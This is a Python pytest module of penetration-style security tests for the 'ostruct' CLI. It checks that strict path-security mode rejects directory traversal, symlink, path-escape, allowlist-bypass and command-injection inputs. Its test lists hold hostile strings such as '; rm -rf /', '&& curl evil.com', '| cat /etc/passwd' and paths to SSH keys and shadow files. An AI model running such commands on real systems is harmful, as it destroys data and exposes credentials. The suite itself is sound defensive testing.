"""Security validation and penetration testing for CLI v0.9.0.

This module implements T6.3: Security Validation and Penetration Testing from the CLI tasks plan.
Tests security controls against various attack vectors and validates security mode enforcement.
"""

import platform
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Any, Dict, List, NamedTuple

import pytest


class TestResult(NamedTuple):
    """Security test result data structure."""

    name: str
    passed: bool
    details: Dict[str, Any]


class SecurityPenetrationTests:
    """Test security controls against various attack vectors."""

    def __init__(self):
        self.test_results = {}
        self.test_data_dir = Path(tempfile.mkdtemp(prefix="ostruct_security_"))
        self._setup_test_files()

    def _setup_test_files(self):
        """Create test files for security testing."""
        # Basic template and schema
        (self.test_data_dir / "template.j2").write_text(
            "Content: {{ data.content }}"
        )
        (self.test_data_dir / "schema.json").write_text(
            '{"type":"object","properties":{"result":{"type":"string"}}}'
        )

        # Legitimate test file
        (self.test_data_dir / "legitimate.txt").write_text("safe content")

        # Create directory structure for testing
        secure_dir = self.test_data_dir / "secure"
        secure_dir.mkdir()
        (secure_dir / "allowed.txt").write_text("allowed content")

    def _run_ostruct_cmd(self, args: List[str]) -> subprocess.CompletedProcess:
        """Run ostruct command for security testing."""
        cmd = ["poetry", "run", "ostruct"] + args
        project_root = Path(__file__).parent.parent
        return subprocess.run(
            cmd, cwd=project_root, capture_output=True, text=True, timeout=30
        )

    def test_directory_traversal_prevention(self) -> TestResult:
        """Test protection against directory traversal attacks."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file://../../sensitive.txt",
            "~/.ssh/id_rsa",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../../../../proc/version",
            "..\\..\\..\\boot.ini",
        ]

        results = {}

        for attempt in traversal_attempts:
            try:
                # Test with strict security mode and limited allowlist
                result = self._run_ostruct_cmd(
                    [
                        "run",
                        str(self.test_data_dir / "template.j2"),
                        str(self.test_data_dir / "schema.json"),
                        "--file",
                        "data",
                        attempt,
                        "--path-security",
                        "strict",
                        "--allow",
                        str(self.test_data_dir),
                        "--dry-run",
                    ]
                )

                # Should fail (non-zero exit code) for security reasons
                if result.returncode != 0:
                    results[attempt] = True  # Correctly blocked
                else:
                    results[attempt] = False  # Attack succeeded - BAD

            except Exception as e:
                results[attempt] = f"Test error: {e}"

        return TestResult(
            name="directory_traversal_prevention",
            passed=all(v is True for v in results.values()),
            details=results,
        )

    def test_symlink_attack_prevention(self) -> TestResult:
        """Test protection against symlink-based attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Create legitimate file
            legit_file = temp_path / "legitimate.txt"
            legit_file.write_text("safe content")

            # Create sensitive file outside allowed area
            sensitive_dir = temp_path.parent / "sensitive"
            sensitive_dir.mkdir(exist_ok=True)
            sensitive_file = sensitive_dir / "secret.txt"
            sensitive_file.write_text("secret data")

            # Create symlink pointing to sensitive file
            symlink = temp_path / "innocent_looking.txt"
            try:
                if platform.system().lower() == "windows":
                    # Windows requires special handling for symlinks
                    return TestResult(
                        "symlink_attack_prevention",
                        True,
                        {"skipped": "Windows symlink testing requires admin"},
                    )
                else:
                    symlink.symlink_to(sensitive_file)
            except OSError:
                # Symlinks not supported
                return TestResult(
                    "symlink_attack_prevention",
                    True,
                    {"skipped": "No symlink support"},
                )

            try:
                # Test with strict security - should block symlink access
                result = self._run_ostruct_cmd(
                    [
                        "run",
                        str(self.test_data_dir / "template.j2"),
                        str(self.test_data_dir / "schema.json"),
                        "--file",
                        "data",
                        str(symlink),
                        "--path-security",
                        "strict",
                        "--allow",
                        str(temp_path),
                        "--dry-run",
                    ]
                )

                # Should fail (symlink attack blocked)
                attack_prevented = result.returncode != 0

                return TestResult(
                    name="symlink_attack_prevention",
                    passed=attack_prevented,
                    details={
                        "blocked": attack_prevented,
                        "exit_code": result.returncode,
                    },
                )
            finally:
                # Cleanup
                shutil.rmtree(sensitive_dir, ignore_errors=True)

    def test_security_mode_enforcement(self) -> TestResult:
        """Test that security modes are enforced correctly."""
        test_file = self.test_data_dir / "security_test.txt"
        test_file.write_text("test content")

        try:
            modes_results = {}

            # Test permissive mode - should allow access
            result = self._run_ostruct_cmd(
                [
                    "run",
                    str(self.test_data_dir / "template.j2"),
                    str(self.test_data_dir / "schema.json"),
                    "--file",
                    "data",
                    str(test_file),
                    "--path-security",
                    "permissive",
                    "--dry-run",
                ]
            )
            modes_results["permissive"] = result.returncode == 0

            # Test warn mode - should allow but warn
            result = self._run_ostruct_cmd(
                [
                    "run",
                    str(self.test_data_dir / "template.j2"),
                    str(self.test_data_dir / "schema.json"),
                    "--file",
                    "data",
                    str(test_file),
                    "--path-security",
                    "warn",
                    "--dry-run",
                ]
            )
            modes_results["warn"] = result.returncode == 0

            # Test strict mode without allowlist - should block
            result = self._run_ostruct_cmd(
                [
                    "run",
                    str(self.test_data_dir / "template.j2"),
                    str(self.test_data_dir / "schema.json"),
                    "--file",
                    "data",
                    str(test_file),
                    "--path-security",
                    "strict",
                    "--dry-run",
                ]
            )
            modes_results["strict_blocks"] = result.returncode != 0

            # Test strict mode with allowlist - should allow
            result = self._run_ostruct_cmd(
                [
                    "run",
                    str(self.test_data_dir / "template.j2"),
                    str(self.test_data_dir / "schema.json"),
                    "--file",
                    "data",
                    str(test_file),
                    "--path-security",
                    "strict",
                    "--allow",
                    str(self.test_data_dir),
                    "--dry-run",
                ]
            )
            modes_results["strict_with_allowlist"] = result.returncode == 0

            return TestResult(
                name="security_mode_enforcement",
                passed=all(
                    [
                        modes_results.get("permissive", False),
                        modes_results.get("warn", False),
                        modes_results.get("strict_blocks", False),
                        modes_results.get("strict_with_allowlist", False),
                    ]
                ),
                details=modes_results,
            )
        finally:
            test_file.unlink(missing_ok=True)

    def test_path_escape_attempts(self) -> TestResult:
        """Test various path escape and injection attempts."""
        malicious_paths = [
            "file:///etc/passwd",
            "http://evil.com/malware",
            "data:text/plain;base64,bWFsaWNpb3Vz",  # base64 encoded
            "javascript:alert('xss')",
            "\\\\network\\share\\file.txt",
            "/dev/null",
            "/proc/self/environ",
            "CON:",  # Windows reserved name
            "LPT1:",  # Windows reserved name
            "file\x00injection.txt",  # null byte injection
        ]

        results = {}

        for malicious_path in malicious_paths:
            try:
                result = self._run_ostruct_cmd(
                    [
                        "run",
                        str(self.test_data_dir / "template.j2"),
                        str(self.test_data_dir / "schema.json"),
                        "--file",
                        "data",
                        malicious_path,
                        "--path-security",
                        "strict",
                        "--allow",
                        str(self.test_data_dir),
                        "--dry-run",
                    ]
                )

                # Should block malicious paths
                results[malicious_path] = result.returncode != 0

            except Exception as e:
                results[malicious_path] = f"Test error: {e}"

        return TestResult(
            name="path_escape_attempts",
            passed=all(
                v is True for v in results.values() if isinstance(v, bool)
            ),
            details=results,
        )

    def test_allowlist_bypass_attempts(self) -> TestResult:
        """Test attempts to bypass security allowlists."""
        # Create allowed directory
        allowed_dir = self.test_data_dir / "allowed"
        allowed_dir.mkdir(exist_ok=True)
        allowed_file = allowed_dir / "safe.txt"
        allowed_file.write_text("safe content")

        # Create forbidden file outside allowed area
        forbidden_file = self.test_data_dir / "forbidden.txt"
        forbidden_file.write_text("forbidden content")

        bypass_attempts = [
            # Case variations
            (
                str(allowed_file).upper()
                if platform.system().lower() == "windows"
                else str(allowed_file)
            ),
            (
                str(allowed_file).lower()
                if platform.system().lower() == "windows"
                else str(allowed_file)
            ),
            # Path variations
            str(allowed_dir / ".." / "allowed" / "safe.txt"),
            str(allowed_dir / "." / "safe.txt"),
            # Forbidden file
            str(forbidden_file),
        ]

        results = {}

        for attempt in bypass_attempts:
            try:
                result = self._run_ostruct_cmd(
                    [
                        "run",
                        str(self.test_data_dir / "template.j2"),
                        str(self.test_data_dir / "schema.json"),
                        "--file",
                        "data",
                        attempt,
                        "--path-security",
                        "strict",
                        "--allow-file",
                        str(allowed_file),
                        "--dry-run",
                    ]
                )

                # Only the exact allowed file should succeed
                if (
                    attempt == str(allowed_file)
                    or Path(attempt).resolve() == allowed_file.resolve()
                ):
                    results[attempt] = result.returncode == 0  # Should succeed
                else:
                    results[attempt] = result.returncode != 0  # Should fail

            except Exception as e:
                results[attempt] = f"Test error: {e}"

        return TestResult(
            name="allowlist_bypass_attempts",
            passed=all(
                v is True for v in results.values() if isinstance(v, bool)
            ),
            details=results,
        )

    def test_command_injection_prevention(self) -> TestResult:
        """Test prevention of command injection through file paths."""
        injection_attempts = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "$(whoami)",
            "`id`",
            "\x00; evil_command",
            "file.txt; echo pwned",
        ]

        results = {}

        for injection in injection_attempts:
            try:
                # These should all fail safely (not execute commands)
                result = self._run_ostruct_cmd(
                    [
                        "run",
                        str(self.test_data_dir / "template.j2"),
                        str(self.test_data_dir / "schema.json"),
                        "--file",
                        "data",
                        injection,
                        "--path-security",
                        "strict",
                        "--allow",
                        str(self.test_data_dir),
                        "--dry-run",
                    ]
                )

                # Should fail due to file not found or security block
                results[injection] = result.returncode != 0

            except Exception as e:
                results[injection] = f"Test error: {e}"

        return TestResult(
            name="command_injection_prevention",
            passed=all(
                v is True for v in results.values() if isinstance(v, bool)
            ),
            details=results,
        )

    def cleanup(self):
        """Clean up test files."""
        if self.test_data_dir.exists():
            shutil.rmtree(self.test_data_dir)


# Pytest integration
@pytest.mark.no_fs
class TestSecurityValidation:
    """Pytest class for security validation and penetration testing."""

    @pytest.fixture(autouse=True)
    def setup_security_tests(self):
        """Setup security test suite."""
        self.security_tests = SecurityPenetrationTests()
        yield
        self.security_tests.cleanup()

    def test_directory_traversal_blocked(self):
        """Test directory traversal attacks are blocked."""
        result = self.security_tests.test_directory_traversal_prevention()
        assert (
            result.passed
        ), f"Directory traversal prevention failed: {result.details}"

    def test_symlink_attacks_blocked(self):
        """Test symlink attacks are blocked."""
        result = self.security_tests.test_symlink_attack_prevention()
        assert (
            result.passed
        ), f"Symlink attack prevention failed: {result.details}"

    def test_security_modes_work(self):
        """Test security modes are enforced correctly."""
        result = self.security_tests.test_security_mode_enforcement()
        assert (
            result.passed
        ), f"Security mode enforcement failed: {result.details}"

    def test_path_escapes_blocked(self):
        """Test path escape attempts are blocked."""
        result = self.security_tests.test_path_escape_attempts()
        assert (
            result.passed
        ), f"Path escape prevention failed: {result.details}"

    def test_allowlist_bypass_blocked(self):
        """Test allowlist bypass attempts are blocked."""
        result = self.security_tests.test_allowlist_bypass_attempts()
        assert (
            result.passed
        ), f"Allowlist bypass prevention failed: {result.details}"

    def test_command_injection_blocked(self):
        """Test command injection attempts are blocked."""
        result = self.security_tests.test_command_injection_prevention()
        assert (
            result.passed
        ), f"Command injection prevention failed: {result.details}"


# Standalone runner
def run_security_validation():
    """Run security validation and penetration tests."""
    security_tests = SecurityPenetrationTests()

    try:
        print(
            f"🔒 Security Validation & Penetration Testing on {platform.system().lower()}"
        )
        print("=" * 60)

        # Run all security tests
        test_methods = [
            security_tests.test_directory_traversal_prevention,
            security_tests.test_symlink_attack_prevention,
            security_tests.test_security_mode_enforcement,
            security_tests.test_path_escape_attempts,
            security_tests.test_allowlist_bypass_attempts,
            security_tests.test_command_injection_prevention,
        ]

        results = []
        for test_method in test_methods:
            try:
                result = test_method()
                results.append(result)
            except Exception as e:
                results.append(
                    TestResult(
                        name=test_method.__name__,
                        passed=False,
                        details={"error": f"Test execution failed: {e}"},
                    )
                )

        passed_count = sum(1 for r in results if r.passed)
        total_count = len(results)

        print("\n🛡️  Security Test Results:")
        for result in results:
            status = "✅ SECURE" if result.passed else "🚨 VULNERABLE"
            print(f"   {status} {result.name}")
            if not result.passed:
                print(f"        Issues: {result.details}")

        print("\n📊 Summary:")
        print(f"   Tests passed: {passed_count}/{total_count}")
        print(f"   Security score: {passed_count / total_count * 100:.1f}%")

        if passed_count == total_count:
            print("\n🎉 All security tests passed! System is secure.")
        else:
            print(
                f"\n⚠️  {total_count - passed_count} security vulnerabilities found!"
            )
            print("🚨 CRITICAL: Fix vulnerabilities before release!")

        return passed_count == total_count

    finally:
        security_tests.cleanup()


if __name__ == "__main__":
    success = run_security_validation()
    exit(0 if success else 1)
